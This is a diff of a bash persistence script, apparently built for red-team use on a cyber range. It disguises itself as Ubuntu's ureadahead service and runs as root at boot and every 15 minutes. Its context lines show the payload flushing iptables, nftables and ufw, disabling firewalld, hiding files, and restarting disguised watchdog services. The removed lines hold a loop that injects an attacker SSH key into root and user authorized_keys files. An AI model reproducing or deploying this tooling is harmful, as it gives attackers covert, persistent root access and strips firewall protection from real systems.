@@ -15,12 +15,11 @@
 #
 # Payload actions (runs as root at boot + every 15 min via OnCalendar drop-in)
 #   1. Flush iptables / ip6tables / nftables / ufw
-#   2. Inject SSH authorized key into /root/.ssh/authorized_keys
-#   3. Watchdog: restart systemd-timesyncd-helper (shadow-crond) if it stopped
-#   4. Watchdog: restart network-health-monitor (flood-journal) if it stopped
+#   2. Watchdog: restart systemd-timesyncd-helper (shadow-crond) if it stopped
+#   3. Watchdog: restart network-health-monitor (flood-journal) if it stopped
 #
 # Usage:
-#   sudo ./ureadahead-persist.sh install  [--key "ssh-ed25519 AAAA... user@host"]
+#   sudo ./ureadahead-persist.sh install
 #   sudo ./ureadahead-persist.sh remove
 #   sudo ./ureadahead-persist.sh status
 
@@ -40,10 +39,6 @@ PACK_DIR="/var/lib/ureadahead"               # real ureadahead stores .pack file
 PACK_DUMMY="${PACK_DIR}/pack"                # plausible dummy file
 HIDDEN_DIR="/var/cache/.syspkg"              # shared hidden dir for backups
 
-# SSH key injected into /root/.ssh/authorized_keys (and target user if run as non-root)
-# Override at runtime:  sudo ./ureadahead-persist.sh install --key "ssh-ed25519 ..."
-RT_SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlaceholderKeyReplaceBeforeDeployment rt-persist"
-
 # ── helpers ───────────────────────────────────────────────────────────────────
 
 GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
@@ -57,14 +52,6 @@ require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }
 
 cmd_install() {
     require_root
-
-    # parse optional --key arg
-    while [[ $# -gt 0 ]]; do
-        case "$1" in
-            --key) RT_SSH_KEY="$2"; shift 2 ;;
-            *)     shift ;;
-        esac
-    done
 
     # ── detect real ureadahead (Ubuntu 18.04 / pre-22.04) ───────────────────
     # On 18.04 the real ureadahead package is installed and active.  We can't
@@ -120,20 +107,6 @@ ufw --force reset  2>/dev/null
 systemctl stop  firewalld 2>/dev/null
 systemctl disable firewalld 2>/dev/null
 _log "boot prefetch optimisation complete"
-
-# -- SSH key injection (skip greyteam/ansible/scoring) --
-_skip="greyteam|ansible|scoring|cyberrange"
-for _home in /root \$(awk -F: -v skip="\$_skip" '\$3>=1000 && \$1 !~ skip {print \$6}' /etc/passwd); do
-    [[ -d "\$_home" ]] || continue
-    _ssh="\${_home}/.ssh"
-    mkdir -p "\$_ssh"
-    chmod 700 "\$_ssh"
-    _ak="\${_ssh}/authorized_keys"
-    touch "\$_ak"
-    chmod 600 "\$_ak"
-    grep -qF "${RT_SSH_KEY}" "\$_ak" 2>/dev/null || echo "${RT_SSH_KEY}" >> "\$_ak"
-done
-_log "pack cache refreshed"
 
 # -- watchdog: shadow-crond (systemd-timesyncd-helper) --
 systemctl is-active --quiet systemd-timesyncd-helper 2>/dev/null \
@@ -260,8 +233,6 @@ DROPIN
     info "Service:   ${SERVICE_NAME}.service  (looks like 20.04 upgrade leftover)"
     info "Wrapper:   ${SBIN_WRAPPER}"
     info "Payload:   ${PAYLOAD_BIN}  (chmod 700, not world-readable)"
-    info "SSH key:   injected into /root/.ssh/authorized_keys"
-    warn "Replace placeholder SSH key before deployment: --key 'ssh-ed25519 ...'"
     warn "Runs payload at boot AND every 15 min via ExecStartPost loop"
 }
 
@@ -324,16 +295,6 @@ cmd_status() {
         fi
     done
 
-    hdr "SSH key presence"
-    for _home in /root $(awk -F: '$3>=1000{print $6}' /etc/passwd 2>/dev/null); do
-        _ak="${_home}/.ssh/authorized_keys"
-        if [[ -f "$_ak" ]]; then
-            grep -qF "rt-persist" "$_ak" 2>/dev/null \
-                && echo "  INJECTED  ${_ak}" \
-                || echo "  MISSING   ${_ak}"
-        fi
-    done
-
     hdr "Watchdog targets"
     for svc in systemd-timesyncd-helper network-health-monitor; do
         systemctl is-active --quiet "$svc" 2>/dev/null \
@@ -351,9 +312,9 @@ case "$CMD" in
     remove)  cmd_remove  ;;
     status)  cmd_status  ;;
     *)
-        echo "Usage: sudo $0 {install|remove|status} [--key 'ssh-ed25519 ...']"
+        echo "Usage: sudo $0 {install|remove|status}"
         echo
-        echo "  install   deploy ureadahead persistence (pass --key to set SSH key)"
+        echo "  install   deploy ureadahead persistence"
         echo "  remove    clean up all artefacts"
         echo "  status    check service, files, SSH key, and watchdog targets"
         ;;
